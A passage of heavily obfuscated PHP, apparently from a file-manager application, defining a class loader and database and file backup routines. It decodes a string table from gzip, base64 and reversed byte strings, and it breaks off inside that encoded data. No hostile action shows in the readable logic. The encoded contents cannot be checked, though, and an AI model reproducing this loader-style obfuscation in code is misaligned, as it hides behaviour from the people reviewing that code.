($Bã‘¢ÍÒÅ«[$CËŒ ÃÚ´‡[457]] != 0) { $cä‡²Õ³„ƒ[] = $Bã‘¢ÍÒÅ«[$CËŒ ÃÚ´‡[457]]; $Bã‘¢ÍÒÅ« = $d—èßæé†³[$Bã‘¢ÍÒÅ«[$CËŒ ÃÚ´‡[457]]]; } goto e–âêËîÔÜ; e–âêËîÔÜ: $cä‡²Õ³„ƒ[] = 0; $cä‡²Õ³„ƒ = $CËŒ ÃÚ´‡[47] . implode($CËŒ ÃÚ´‡[47], array_reverse($cä‡²Õ³„ƒ)) . $CËŒ ÃÚ´‡[47]; $this->setNamePinyin($F¾ÌÖ™‡[$fğæµŒÆ š], $F¾ÌÖ™‡[$CËŒ ÃÚ´‡[28]]); goto fˆ–¤ÅÜ“; d²™˜šùí: } return $d—èßæé†³; } public function groupNameAuto($aöò”Ô´¿÷, $Bâ¤óÍùˆ†) { $D‰¿ ¬Ï¾ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cà—Ô‚¥…ê = $this->where(array($D‰¿ ¬Ï¾[365] => $aöò”Ô´¿÷))->getField($D‰¿ ¬Ï¾[28], !0); if (!$cà—Ô‚¥…ê || !in_array($Bâ¤óÍùˆ†, $cà—Ô‚¥…ê)) { return $Bâ¤óÍùˆ†; } for ($d¯Ë­‚ÛÔ = 1; $d¯Ë­‚ÛÔ <= count($cà—Ô‚¥…ê) + 1; $d¯Ë­‚ÛÔ++) { $cÌóÁ¯—§Ü = $Bâ¤óÍùˆ† . "\50{$d¯Ë­‚ÛÔ}\x29"; if (!in_array($cÌóÁ¯—§Ü, $cà—Ô‚¥…ê)) { return $cÌóÁ¯—§Ü; } } } } goto AÅœÑŠô; D«ƒå¾Ğ: function Action($EîçÆÇÆæë = '') { goto Fßí„Áâ‹; d„Í±’ƒÂ¸: $F¢“¹ŸÏè = strtolower($dášˆ¬ô¸ª); if (isset($c‰Ù‚Å¤¼Ù[$F¢“¹ŸÏè])) { return $c‰Ù‚Å¤¼Ù[$F¢“¹ŸÏè]; } if (is_file($EÂ†ÏœŞ‹‹)) { include_once $EÂ†ÏœŞ‹‹; } goto eô‚ÒÄ¥»; Fßí„Áâ‹: $BİÖ²àŒ ¥ =& $_SERVER[Ÿ²ù¬]; static $c‰Ù‚Å¤¼Ù = array(); $EîçÆÇÆæë = trim(str_replace($BİÖ²àŒ ¥[4], $BİÖ²àŒ ¥[5], $EîçÆÇÆæë), $BİÖ²àŒ ¥[4]); goto eå‹ğôè‚ô; eô‚ÒÄ¥»: if (!class_exists($dášˆ¬ô¸ª)) { return actionCallError("\x5b{$EîçÆÇÆæë}\40\75\x3e\x20{$dášˆ¬ô¸ª}\x5d\40\x63\154\141\x73\x73\40\x6e\x6f\164\x20\145\170\151\163\164\x73\x21"); } $c‰Ù‚Å¤¼Ù[$F¢“¹ŸÏè] = new $dášˆ¬ô¸ª(); return $c‰Ù‚Å¤¼Ù[$F¢“¹ŸÏè]; goto E´´Ä¦±Ú„; eå‹ğôè‚ô: $aÃ„ºÏøà¸ = explode($BİÖ²àŒ ¥[5], $EîçÆÇÆæë); $AµÖäº¶„Î = strtolower($aÃ„ºÏøà¸[0]); if (substr($AµÖäº¶„Î, -6) == $BİÖ²àŒ ¥[6]) { $EîçÆÇÆæë = substr($aÃ„ºÏøà¸[0], 0, -6); $dášˆ¬ô¸ª = $EîçÆÇÆæë . $BİÖ²àŒ ¥[7]; $EÂ†ÏœŞ‹‹ = $BİÖ²àŒ ¥[8]; if (isset($aÃ„ºÏøà¸[1]) && substr(strtolower($aÃ„ºÏøà¸[1]), -5) == $BİÖ²àŒ ¥[9]) { $dášˆ¬ô¸ª = $EîçÆÇÆæë . $aÃ„ºÏøà¸[1]; $EÂ†ÏœŞ‹‹ = $BİÖ²àŒ ¥[10] . $aÃ„ºÏøà¸[1] . $BİÖ²àŒ ¥[11]; } else { if (count($aÃ„ºÏøà¸) == 3) { $dášˆ¬ô¸ª = $EîçÆÇÆæë . $aÃ„ºÏøà¸[1] . $aÃ„ºÏøà¸[2]; $EÂ†ÏœŞ‹‹ = $BİÖ²àŒ ¥[12] . $aÃ„ºÏøà¸[1] . $BİÖ²àŒ ¥[13] . $aÃ„ºÏøà¸[2] . $BİÖ²àŒ ¥[11]; } } $EÂ†ÏœŞ‹‹ = PLUGIN_DIR . $EîçÆÇÆæë . $BİÖ²àŒ ¥[4] . $EÂ†ÏœŞ‹‹; } else { if (substr($AµÖäº¶„Î, -5) == $BİÖ²àŒ ¥[9]) { $EîçÆÇÆæë = substr($aÃ„ºÏøà¸[0], 0, -5); return Model($EîçÆÇÆæë); } else { $dášˆ¬ô¸ª = $aÃ„ºÏøà¸[0] . $aÃ„ºÏøà¸[1]; $EÂ†ÏœŞ‹‹ = CONTROLLER_DIR . $aÃ„ºÏøà¸[0] . $BİÖ²àŒ ¥[4] . $aÃ„ºÏøà¸[1] . $BİÖ²àŒ ¥[14]; } } goto d„Í±’ƒÂ¸; E´´Ä¦±Ú„: } function ActionApply($c›Æ¡Å¦À¦, $CÎ×–á‰©º = array()) { goto e¾öæ‚Ë¬; e¾öæ‚Ë¬: if (is_array($c›Æ¡Å¦À¦)) { return call_user_func_array($c›Æ¡Å¦À¦, $CÎ×–á‰©º); } if (function_exists($c›Æ¡Å¦À¦)) { return call_user_func_array($c›Æ¡Å¦À¦, $CÎ×–á‰©º); } $Aºîì¿¸„ = strrpos($c›Æ¡Å¦À¦, $_SERVER[Ÿ²ù¬][5]); goto fß¨ùÜÏ”†; fß¨ùÜÏ”†: $B‡ó±¤¦¶° = substr($c›Æ¡Å¦À¦, 0, $Aºîì¿¸„); $b†³ÉÍŒâÎ = substr($c›Æ¡Å¦À¦, $Aºîì¿¸„ + 1); $F¨ñ¤¡º’ = Action($B‡ó±¤¦¶°); goto A´£÷ì¯Œ; A´£÷ì¯Œ: if (!method_exists($F¨ñ¤¡º’, $b†³ÉÍŒâÎ)) { return actionCallError("{$c›Æ¡Å¦À¦}\40\155\x65\x74\150\x6f\144\40\x6e\157\164\40\x65\x78\x69\x73\164\163\x21"); } $c–¦›«é´Ê = call_user_func_array(array($F¨ñ¤¡º’, $b†³ÉÍŒâÎ), $CÎ×–á‰©º); return $c–¦›«é´Ê; goto f¶±ç“õÛ; f¶±ç“õÛ: } function actionCallError($A¿Üïáƒ¨­) { $c•¯‹˜ÇÕÃ =& $_SERVER[Ÿ²ù¬]; $b­Ñ¯ï˜ºÚ = json_encode_force(array($c•¯‹˜ÇÕÃ[15] => this_url(), $c•¯‹˜ÇÕÃ[16] => $GLOBALS[$c•¯‹˜ÇÕÃ[16]])); $b­Ñ¯ï˜ºÚ = str_replace(array($c•¯‹˜ÇÕÃ[17]), array($c•¯‹˜ÇÕÃ[4]), $b­Ñ¯ï˜ºÚ); return write_log($A¿Üïáƒ¨­ . $c•¯‹˜ÇÕÃ[18] . $b­Ñ¯ï˜ºÚ, $c•¯‹˜ÇÕÃ[19]); } goto a©´˜±†¿ˆ; dó†Ì™¿»: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto Cõ’‹‹£‰‚; BÄ Õ‰‰İ™: $c©…¬èíÂ…->end(); $dÙ»äç÷Ó = array($dÓò·ç³é¸[715] => $Báë¯í°¥á, $dÓò·ç³é¸[702] => 1, $dÓò·ç³é¸[716] => $BËËøÀÅŸÓ, $dÓò·ç³é¸[717] => $BËËøÀÅŸÓ); Backup::set($dÙ»äç÷Ó); goto f³÷ß—ó¾; E“®ª‡«£: mk_dir($Aâˆ…£„÷š); $CÉáÂŒ‡‘Ç = $bÆ´¾‚¢¥÷->db()->getTables(); $BËËøÀÅŸÓ = 0; goto fñ·¤®‘‘Ğ; fñ·¤®‘‘Ğ: $c©…¬èíÂ… = new Task($dÓò·ç³é¸[706], $dÓò·ç³é¸[707], 0, LNG($dÓò·ç³é¸[708]) . $dÓò·ç³é¸[709] . LNG($dÓò·ç³é¸[710])); $CÉáÂŒ‡‘Ç = array_diff($CÉáÂŒ‡‘Ç, array($dÓò·ç³é¸[711], $dÓò·ç³é¸[712])); foreach ($CÉáÂŒ‡‘Ç as $D¢–˜¥ä¢) { $eóƒÉƒßÓ§ = $Aâˆ…£„÷š . $D¢–˜¥ä¢ . $dÓò·ç³é¸[713]; $e¨Í·¯Ï±÷ = null; if ($D¢–˜¥ä¢ == $dÓò·ç³é¸[714] && (!isset($CïÛ†Áğ[$dÓò·ç³é¸[687]]) || $CïÛ†Áğ[$dÓò·ç³é¸[687]] == $dÓò·ç³é¸[464])) { $e¨Í·¯Ï±÷ = self::$io; } $BËËøÀÅŸÓ += $bÆ´¾‚¢¥÷->sqlFromDb($D¢–˜¥ä¢, $eóƒÉƒßÓ§, $c©…¬èíÂ…, $e¨Í·¯Ï±÷); } goto BÄ Õ‰‰İ™; Cõ’‹‹£‰‚: $dÓò·ç³é¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CïÛ†Áğ = Backup::get(); self::$io = $CïÛ†Áğ[$dÓò·ç³é¸[686]]; goto e¡Â†¹Œğå; B§×ˆ†¾¿Ø: $bÆ´¾‚¢¥÷ = new DbManage($AªÙ‚‘ª²‰, $Báë¯í°¥á); $Aâˆ…£„÷š = TEMP_FILES . $dÓò·ç³é¸[705] . self::$name . $dÓò·ç³é¸[8]; del_dir($Aâˆ…£„÷š); goto E“®ª‡«£; f³÷ß—ó¾: return !0; goto Dê¿æÊçƒÖ; e¡Â†¹Œğå: self::$name = $CïÛ†Áğ[$dÓò·ç³é¸[28]]; $AªÙ‚‘ª²‰ = $GLOBALS[$dÓò·ç³é¸[6]][$dÓò·ç³é¸[17]]; $Báë¯í°¥á = $this->_dbType($AªÙ‚‘ª²‰); goto B§×ˆ†¾¿Ø; Dê¿æÊçƒÖ: } private function _dbType($a¨ë°Ûã) { $Eºî²ğˆëË =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÄ¥İ¤À = $a¨ë°Ûã[$Eºî²ğˆëË[718]]; if ($EÄ¥İ¤À == $Eºî²ğˆëË[719]) { $Cê©™Ä¹¾ = explode($Eºî²ğˆëË[4], $a¨ë°Ûã[$Eºî²ğˆëË[720]]); $EÄ¥İ¤À = $Cê©™Ä¹¾[0]; } $aŞùÛîâÛø = array($Eºî²ğˆëË[721] => $Eºî²ğˆëË[9], $Eºî²ğˆëË[722] => $Eºî²ğˆëË[723]); if (isset($aŞùÛîâÛø[$EÄ¥İ¤À])) { $EÄ¥İ¤À = $aŞùÛîâÛø[$EÄ¥İ¤À]; } return $EÄ¥İ¤À; } } class BackupDbFile { public function __construct() { } public function index() { goto b§ÊÚ“‘‚Ñ; dÒ¾ÍÏœÂ: $AŸØç‚ÖùŒ = new TaskFileTransfer($cÙåÖãÜï§[724], $cÙåÖãÜï§[707], 0, LNG($cÙåÖãÜï§[708]) . $cÙåÖãÜï§[408] . LNG($cÙåÖãÜï§[710]) . $cÙåÖãÜï§[725]); $AŸØç‚ÖùŒ->addPath($A÷¿â¤Ø×«); $e¯ª˜™›ˆ = IO::infoWithChildren($A÷¿â¤Ø×«); goto E ù¯Ğë¹‚; Bƒ£éÍï: return !0; goto b¹˜ÀçÛÊ÷; E ù¯Ğë¹‚: Backup::set(array($cÙåÖãÜï§[726] => $e¯ª˜™›ˆ[$cÙåÖãÜï§[77]])); IO::move($A÷¿â¤Ø×«, $EÅ«Â‹ÒÒ­); $E’âß©¬ë = CONTROLLER_DIR . $cÙåÖãÜï§[727]; goto EÕŠà‹¨†“; aöİ¥¸–Ï¦: $A÷¿â¤Ø×« = TEMP_FILES . "\x62\141\143\x6b\165\160\x5f{$eŠ¢­³Îö}\57"; $EÅ«Â‹ÒÒ­ = "\173\x69\x6f\x3a{$D÷Æ•®Ä[$cÙåÖãÜï§[686]]}\x7d\57\x64\141\164\x61\x62\141\163\145\57"; IO::mkdir($EÅ«Â‹ÒÒ­ . "\142\x61\143\153\165\160\x5f{$eŠ¢­³Îö}\x2f"); goto dÒ¾ÍÏœÂ; b§ÊÚ“‘‚Ñ: $cÙåÖãÜï§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D÷Æ•®Ä = Backup::get(); $eŠ¢­³Îö = $D÷Æ•®Ä[$cÙåÖãÜï§[28]]; goto aöİ¥¸–Ï¦; EÕŠà‹¨†“: IO::copy($E’âß©¬ë, $EÅ«Â‹ÒÒ­ . "\142\141\143\153\165\160\x5f{$eŠ¢­³Îö}\57"); $AŸØç‚ÖùŒ->end(); Backup::set(array($cÙåÖãÜï§[728] => $e¯ª˜™›ˆ[$cÙåÖãÜï§[77]])); goto Bƒ£éÍï; b¹˜ÀçÛÊ÷: } } class BackupFile { public function __construct() { } public function index() { goto fƒè±İÉÃò; fƒè±İÉÃò: $b³Ôìòê§× = Backup::get(); $bôæĞ¼å» = $b³Ôìòê§×[$_SERVER[ÚŠ•´ÍéÒÑÔ][278]][$_SERVER[ÚŠ•´ÍéÒÑÔ][164]][$_SERVER[ÚŠ•´ÍéÒÑÔ][415]]; $Bß¡Ëàçİ = array($_SERVER[ÚŠ•´ÍéÒÑÔ][416] => array($_SERVER[ÚŠ•´ÍéÒÑÔ][729], $bôæĞ¼å»), $_SERVER[ÚŠ•´ÍéÒÑÔ][730] => array($_SERVER[ÚŠ•´ÍéÒÑÔ][316], $b³Ôìòê§×[$_SERVER[ÚŠ•´ÍéÒÑÔ][686]])); goto cğ½ö˜¢Ÿ; Fˆ²ëŒÉÂØ: $Aš¸”‹Òò = $E©™”é³Í = 0; do { $CìÜğ—‡ = $_SERVER[ÚŠ•´ÍéÒÑÔ][735]; $FŒÂäö²‹ = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][714])->where($Bß¡Ëàçİ)->field($CìÜğ—‡)->order($_SERVER[ÚŠ•´ÍéÒÑÔ][736])->selectPage($FÑ•Ş²œÊ, $bó½¦­Îøğ); $cá¸÷íÂ¾º = !empty($FŒÂäö²‹[$_SERVER[ÚŠ•´ÍéÒÑÔ][351]]) ? $FŒÂäö²‹[$_SERVER[ÚŠ•´ÍéÒÑÔ][351]] : array(); foreach ($cá¸÷íÂ¾º as $Eêë—˜Ã¤ˆ) { goto a¿‘Ÿ­£œ; AÓÃ°©âë: $A…Õ‚³ƒÚ¾ += $Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]]; $E©™”é³Í += 1; $Aš¸”‹Òò += $Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]]; goto C®ñø“Œ»ù; a¿‘Ÿ­£œ: if (!$this->_fileExist($Eêë—˜Ã¤ˆ, $B–Â”šÒ®§, $BøÀƒ¿)) { $DÉ‹Ûëâ‚„ -= 1; $B¿ô¹ÔÌ­ -= (int) $Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]]; write_log("\x66\151\154\145\x20\156\x6f\164\x20\145\170\x69\163\164\x2e\146\151\154\145\x49\x44\x3a{$Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][415]]}\54\40\x70\x61\x74\x68\x3a{$Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]]}", $_SERVER[ÚŠ•´ÍéÒÑÔ][737]); continue; } $BÓòƒÅ…§ = $Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]]; $eîÈŒì®‚¼ = "\x7b\151\x6f\x3a{$b³Ôìòê§×[$_SERVER[ÚŠ•´ÍéÒÑÔ][686]]}\175" . substr($BÓòƒÅ…§, strlen("\173\151\x6f\x3a{$Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][738]]}\x7d")); goto E·ó·åñàË; C®ñø“Œ»ù: if ($A…Õ‚³ƒÚ¾ >= 1024 * 1024 * 100) { $Eî—æÍ¹Š = array($_SERVER[ÚŠ•´ÍéÒÑÔ][742] => $bôæĞ¼å», $_SERVER[ÚŠ•´ÍéÒÑÔ][743] => $E©™”é³Í, $_SERVER[ÚŠ•´ÍéÒÑÔ][744] => $Aš¸”‹Òò); Backup::set($Eî—æÍ¹Š); $A…Õ‚³ƒÚ¾ = $D¶åßÁ©÷’ = 0; } goto aº‹Êëø—ó; E·ó·åñàË: if (IO::exist($eîÈŒì®‚¼)) { $Bô„Ó°Æš’->updateFileEnd($Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][28]], $Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]]); } else { $eîÈŒì®‚¼ = get_path_father($eîÈŒì®‚¼); IO::mkdir($eîÈŒì®‚¼); if (!IO::copy($BÓòƒÅ…§, $eîÈŒì®‚¼, $_SERVER[ÚŠ•´ÍéÒÑÔ][739])) { write_log($_SERVER[ÚŠ•´ÍéÒÑÔ][740] . $BÓòƒÅ…§ . $_SERVER[ÚŠ•´ÍéÒÑÔ][741] . $eîÈŒì®‚¼ . $_SERVER[ÚŠ•´ÍéÒÑÔ][472], $_SERVER[ÚŠ•´ÍéÒÑÔ][707]); $eùÔÊÆºÆÁ = !1; break; } } $bôæĞ¼å» = $Eêë—˜Ã¤ˆ[$_SERVER[ÚŠ•´ÍéÒÑÔ][415]]; $D¶åßÁ©÷’ += 1; goto AÓÃ°©âë; aº‹Êëø—ó: } $dííÇ›„ = count($cá¸÷íÂ¾º); $bó½¦­Îøğ++; } while ($dííÇ›„ == $FÑ•Ş²œÊ); $Bô„Ó°Æš’->end(); goto c¾°…áÔ‘À; DµåÛ“õÑÈ: Backup::set($Eî—æÍ¹Š); $this->_fileFilter($B–Â”šÒ®§); return !0; goto DÏÃ·Ÿµ®«; Eˆ»¦Š»ôá: $eùÔÊÆºÆÁ = !0; $BøÀƒ¿ = $this->storeIds(); $bó½¦­Îøğ = 1; goto FØ¯¥Ç¢Â; B¹ö±Â¹–Ó: $Bô„Ó°Æš’->task[$_SERVER[ÚŠ•´ÍéÒÑÔ][693]] = $B¿ô¹ÔÌ­; $Eî—æÍ¹Š = array($_SERVER[ÚŠ•´ÍéÒÑÔ][733] => $DÉ‹Ûëâ‚„, $_SERVER[ÚŠ•´ÍéÒÑÔ][734] => $B¿ô¹ÔÌ­); Backup::set($Eî—æÍ¹Š); goto Eˆ»¦Š»ôá; FØ¯¥Ç¢Â: $FÑ•Ş²œÊ = 1000; $A…Õ‚³ƒÚ¾ = $D¶åßÁ©÷’ = 0; $B–Â”šÒ®§ = array(); goto Fˆ²ëŒÉÂØ; cğ½ö˜¢Ÿ: $DÉ‹Ûëâ‚„ = (int) Model($_SERVER[ÚŠ•´ÍéÒÑÔ][714])->where($Bß¡Ëàçİ)->count($_SERVER[ÚŠ•´ÍéÒÑÔ][415]); $B¿ô¹ÔÌ­ = (int) Model($_SERVER[ÚŠ•´ÍéÒÑÔ][714])->where($Bß¡Ëàçİ)->sum($_SERVER[ÚŠ•´ÍéÒÑÔ][77]); $Bô„Ó°Æš’ = new TaskFileTransfer($_SERVER[ÚŠ•´ÍéÒÑÔ][731], $_SERVER[ÚŠ•´ÍéÒÑÔ][707], $DÉ‹Ûëâ‚„, LNG($_SERVER[ÚŠ•´ÍéÒÑÔ][708]) . $_SERVER[ÚŠ•´ÍéÒÑÔ][709] . LNG($_SERVER[ÚŠ•´ÍéÒÑÔ][732])); goto B¹ö±Â¹–Ó; c¾°…áÔ‘À: $BšÒ¸ÑŸÍ˜ = $eùÔÊÆºÆÁ ? 1 : 0; $Eî—æÍ¹Š = array($_SERVER[ÚŠ•´ÍéÒÑÔ][745] => 1, $_SERVER[ÚŠ•´ÍéÒÑÔ][698] => time(), $_SERVER[ÚŠ•´ÍéÒÑÔ][704] => $BšÒ¸ÑŸÍ˜, $_SERVER[ÚŠ•´ÍéÒÑÔ][742] => $bôæĞ¼å», $_SERVER[ÚŠ•´ÍéÒÑÔ][734] => $B¿ô¹ÔÌ­, $_SERVER[ÚŠ•´ÍéÒÑÔ][733] => $DÉ‹Ûëâ‚„); if ($D¶åßÁ©÷’) { $Eî—æÍ¹Š[$_SERVER[ÚŠ•´ÍéÒÑÔ][743]] = $E©™”é³Í; $Eî—æÍ¹Š[$_SERVER[ÚŠ•´ÍéÒÑÔ][744]] = $Aš¸”‹Òò; } goto DµåÛ“õÑÈ; DÏÃ·Ÿµ®«: } private function _fileExist($Dšµö‹Ÿ‹, &$b…Â”µ’ÊÉ, $DßğŒî¤õ—) { goto eŒˆš›ÙÈ; B®–‰Àµì›: if (!in_array($Dšµö‹Ÿ‹[$a£§º»¶ÅÒ[738]], $DßğŒî¤õ—)) { return !1; } if (IO::exist($a›²†‡ ×ê)) { return !0; } $BÜÓ»¤á‹ = get_path_father($a›²†‡ ×ê); goto Dœİö„«ª; Dœİö„«ª: if (IO::exist($BÜÓ»¤á‹)) { $b…Â”µ’ÊÉ[] = $Dšµö‹Ÿ‹[$a£§º»¶ÅÒ[415]]; return !1; } $A°”ÆùÏ…Á = array($a£§º»¶ÅÒ[738] => $Dšµö‹Ÿ‹[$a£§º»¶ÅÒ[738]], $a£§º»¶ÅÒ[75] => array($a£§º»¶ÅÒ[746], "{$BÜÓ»¤á‹}\45")); $eó³„ç‚ = Model($a£§º»¶ÅÒ[714])->where($A°”ÆùÏ…Á)->field($a£§º»¶ÅÒ[416])->select(); goto dé˜º­ Ü±; dé˜º­ Ü±: $b…Â”µ’ÊÉ = array_merge($b…Â”µ’ÊÉ, array_to_keyvalue($eó³„ç‚, $a£§º»¶ÅÒ[33], $a£§º»¶ÅÒ[415])); return !1; goto f‘é¥ñÓÇº; eŒˆš›ÙÈ: $a£§º»¶ÅÒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a›²†‡ ×ê = $Dšµö‹Ÿ‹[$a£§º»¶ÅÒ[75]]; if (in_array($Dšµö‹Ÿ‹[$a£§º»¶ÅÒ[415]], $b…Â”µ’ÊÉ)) { return !1; } goto B®–‰Àµì›; f‘é¥ñÓÇº: } private function _fileFilter($BëŸ™ìÄÒ§) { $D’Ú¬ªæ¦œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($BëŸ™ìÄÒ§)) { return; } $Cˆ†‰¢ª…º = array($D’Ú¬ªæ¦œ[415] => array($D’Ú¬ªæ¦œ[7], array_unique($BëŸ™ìÄÒ§))); $FĞâá±òï = Model($D’Ú¬ªæ¦œ[747])->where($Cˆ†‰¢ª…º)->field($D’Ú¬ªæ¦œ[366])->select(); foreach ($FĞâá±òï as $B™œ‹ÚÌ) { Model($D’Ú¬ªæ¦œ[747])->remove($B™œ‹ÚÌ[$D’Ú¬ªæ¦œ[366]], !1); } } private function storeIds() { $E¯÷Ê“‚»˜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Fµ°Äß‡½Ë = Model($E¯÷Ê“‚»˜[699])->listData(); return array_to_keyvalue($Fµ°Äß‡½Ë, $E¯÷Ê“‚»˜[33], $E¯÷Ê“‚»˜[364]); } } goto Fµ¡îÖÇ×; Bâ¸Ûğ•áç: if (!function_exists('_kodDe')) { function _kodDe($FğëÒâî¦³) { $FğëÒâî¦³ = base64_decode($FğëÒâî¦³); $A¡«¶Ñ…‰ = strlen($FğëÒâî¦³); $C‘¨ˆ¬Ãõ = ''; $F¿®ÄÖ‰º = ord($FğëÒâî¦³[0]) - 30; for ($e­«æŸƒ‰ø = 1; $e­«æŸƒ‰ø < $A¡«¶Ñ…‰; $e­«æŸƒ‰ø += 2) { if ($e­«æŸƒ‰ø + 1 < $A¡«¶Ñ…‰) { $C‘¨ˆ¬Ãõ .= chr(ord($FğëÒâî¦³[$e­«æŸƒ‰ø + 1]) + $F¿®ÄÖ‰º); $C‘¨ˆ¬Ãõ .= chr(ord($FğëÒâî¦³[$e­«æŸƒ‰ø]) + $F¿®ÄÖ‰º); } else { $C‘¨ˆ¬Ãõ .= chr(ord($FğëÒâî¦³[$e­«æŸƒ‰ø]) + $F¿®ÄÖ‰º); } } return $C‘¨ˆ¬Ãõ; } } define("\xda\x8a\x95\xb4\xcd\xe9\xd2\xd1\xd4", strrev('š”‡‡')); $_SERVER[ÚŠ•´ÍéÒÑÔ] = explode("\174\1\174\2\174\6", gzinflate(substr(strrev('l’»¼­%¤­%e±\'’9m‰Xä–D\\¯‡Kà“‹_r…¡¹g0õÅ|	}'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\47\341\10\107\50\224\160\37\245\245\224\373\276\112\303\175\224\160\267\37\24\112\113\201\24\112\201\204\63\264\245\55\345\346\233\173\146\127\62\245\177\176\70\232\171\363\146\166\216\67\157\336\314\274\367\346"._kodDe('KFWAbHSwwc2TqONx5Neda5V3sZPV7mepztLs8/9hrd9k85kqsXV1FbU0y9eo0Hh1U4RKEiWfbj9k').strrev('àøøî.•_›eËu9‘™®Êî|mûcëDéûKÁïxT\\¯RVSŸ§éù«ÜÚïØîóÅÕš«Íô').base64_decode('TrrlnCs3PvqefvW+b07sY7wzeVuhp9T32rRbluz5rDfz+5t+/sLwrY/+55t72n/b2HnwzT9dv/Q=')."\xcd\x99\xdf\xfb\xfb\xeb\x93\xa7\x7e\xfa\xfa\xea\xc3\xce\xed\x38\xe9\x6f\xf5\xd3\xe4\xe0\x23\xd1\x3d\xf7\x94\xe5\x7b\x56\xd7\xcd\xf8\xe1\x2f\x66\x9e\xd2\xb9\xe7\xdb\xaf\xdd\x1f\x9b\xf1\xf9\x3f\x3d\xf\x9e\x71\x9e\xc3\xbf\x79".base64_decode('1+Huy34Ql2e8ef0zb/aujR3QeOUK91XZy7Z/OHdJOnux6+XkT84t7T76wXGNv6nbMfvZjiNSz+w=')._kodDe('KsfuAvezAXLhgNojpzGMkPG0tYtfoavucc2ybbPnsmuihiNjYuYxXRaWTsBk22JwIF9RbmLNbPEF')."\351\35\377\154\131\231\273\57\273\377\307\367\231\375\177\176\150\217\237\237\270\357\253\227\365\176\365\353\153\367\132\371\344\56\217\257\371\335\56\321\310\113\167\154\70\162\305\345\337\234\277\175\116\150\311\313"."\x66\x4f\x66\xda\x70\xe3\x45\x9d\x7d\x7b\xae\xbb\xe4\x8b\xdf\xb8\x3e\x9d\xfe\xd5\xee\x77\x3f\xb5\xef\xe7\x7f\xd9\x65\xa7\x9d\x70\x47\xb7\xe3\x1f\x29\xaf\x99\x92\x32\xae\x1a\xa6\x81\x1\x9\x2d\x9f\x52\xd3\x38\xac\xe6\xf1\xaf".base64_decode('G/8YY1nVVHA41h+MxMKDAwP+UCRGShTTc1qShAqyLudI4QVFN8CnxOJiBa2g5C0QDkjKphyXDVI=')."\222\257\53\346\363\17\364\6\127\304\42\53\6\374\4\43\36\33\53\52\372\4\216\241\140\330\224\165\63\242\346\24\206\121\326\131\275\272\374\213\2\375\122\44\344\351\17\173\274\221\100\260\37\203\275\301"."\276\276\100\244\22\36\12\366\366\166\171\274\113\52\123\6\102\236\105\175\36\11\324\57\253\304\324\174\112\253\223\126\343\224\325\122\75\16\164\253\112\66\211\203\171\231\126\307\234\50\220\120\204\205\300\30"."\xe4\x8b\xd9\x2c\x8e\xf4\xb3\x10\xa9\xbf\x92\x92\x8b\x59\xd2\x67\x3e\x31\x52\xd0\xd5\x9c\x4c\x9b\xbe\x44\x99\x60\x50\x1c\x90\x8b\xa6\xa6\xe6\x13\x38\xe2\x1f\x37\x75\x99\xc3\x41\x8d\x13\xba\x92\x53\xf2\xa4\xa8\xb0\xbf\xd7\xef"."\215\110\260\232\122\167\50\330\47\221\241\310\311\206\251\350\322\120\217\77\344\227\140\325\73\153\121\213\153\45\234\157\260\37\164\210\344\351\355\225\246\52\301\124\162\5\132\14\316\123\245\260\140\310\347\17".base64_decode('SV0rJN5PCS2X0/IuUAoYT1Ooqj8UwgEHoeDeABw6Egl2d4f9LEYat7QX1KSVUKkllkxlzVhJzhY=')."\x29\xb1\x8e\xe2\xdf\x5a\xf2\x43\x7e\x35\x83\x10\xf0\x98\x9a\x57\x8b\x84\x58\x49\x11\x9a\xc6\x66\xe\x9\x14\x29\xb6\x42\x21\x39\x90\x4d\x23\x73\xa\x4c\xb0\x12\xe\x76\xce\xc7\xbf\xf3\x8\x52\x3c\x6\xd3\x14\xdd\x8c\x29\xf9"."\x84\x96\x54\xf3\x64\x1a\x2e\x20\x53\x8e\x10\x9e\x6c\x66\x7c\xba\xa\xf0\x48\x81\x9a\x2b\xa1\x15\x26\xfa\xb4\x12\x69\x43\x4a\xcd\x2a\xbd\x6c\x96\xa5\xb4\x6c\x52\xd1\x79\xbc\x0\xb2\x8b\x29\xa4\x31\xea\xa4\x90\xbb\xbf\x98\x13"."\121\130\64\221\121\263\111\235\116\316\157\303\154\46\305\52\246\11\232\141\320\232\16\26\262\232\234\14\53\272\120\373\156\120\114\260\150\212\300\42\102\353\326\364\234\17\60\0\322\73\200\354\325\301\52\11".base64_decode('o5Twk0Kn4BLo4HkzxfxomDXRRbha3fDJzq9HhheCf+oJi4uSemeUbDamjCtk9uSSMw3aNLcRV/M=')."\156\0\301\321\100\60\226\221\215\114\137\162\146\14\345\242\234\63\251\214\273\12\231\2\231\340\154\116\23\262\206\243\320\257\231\176\201\361\146\265\204\114\220\62\246\131\10\53\371\44\354\32\322\66\255\234"."\x47\x5d\x57\x50\x14\xd2\x2c\x9f\x43\x4a\x4a\x7d\xd2\xa\xa9\xa7\x5d\x6d\xa7\x74\x6\xa8\x26\x35\xc1\x79\x5f\xc6\xcc\xb1\x22\x73\xb4\x69\xc\x66\x30\xa0\x39\x4e\xa8\xa3\x86\xc4\x95\x71\x93\xf4\x88\x34\x2f\x91\x91\x75\x30\x90"."\235\105\63\345\234\103\130\110\241\220\125\23\262\251\152\171\267\226\60\25\323\151\230\272\42\223\322\